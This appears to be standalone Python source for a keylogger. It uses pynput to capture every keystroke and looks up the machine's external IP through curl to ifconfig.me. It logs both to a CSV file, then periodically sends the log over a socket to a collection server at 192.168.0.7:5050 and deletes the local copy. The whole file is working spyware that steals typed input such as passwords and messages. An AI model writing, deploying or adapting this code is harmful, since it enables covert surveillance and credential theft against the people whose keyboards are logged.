from pynput import keyboard
import socket
import os.path



HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "192.168.0.7"
ADDR = (SERVER, PORT)


file = 'log4.csv'
external_ip = os.popen('curl -s ifconfig.me').readline()

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)


def manager(key):
    global client
    
    if os.path.isfile(file)==False:
        record_ip()
        input_key(key)

    else:
        with open(file, 'rb+') as handler:      
            data = handler.read()  
            num_chars = len(data)

        if num_chars > 50:
            client.connect(ADDR)
            input_key(key)
            string_data = str(data)
            string_data = string_data + ' '
            send(string_data)
            send(DISCONNECT_MESSAGE)
            os.remove(file)
            client.close()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            input_key(key)


def record_ip():
    with open(file, 'a') as csvfile:
        csvfile.write(external_ip + ",") 
        # csvfile.write(local_ip + ",")

def input_key(key):

    with open(file, 'a') as csvfile:
        try:             
            if key == keyboard.Key.space or key == keyboard.Key.tab:    
                csvfile.write(",")

            elif key == keyboard.Key.backspace:
                delete_key()

            else:
                char = key.char
                csvfile.write(char)
        except:
            pass

def delete_key():
    with open(file, 'rb+') as handler:      
        data = handler.read()  
        num_chars = len(data)
        safe_ip = (len(external_ip) + 1)

        if num_chars > safe_ip:
            handler.seek(-1, os.SEEK_END)
            handler.truncate()
        else:
            pass

        
        handler.truncate()



if __name__ == "__main__":
    logger = keyboard.Listener(on_press=manager) #built in key input should actually be input_key(key)
    logger.start()
    input()
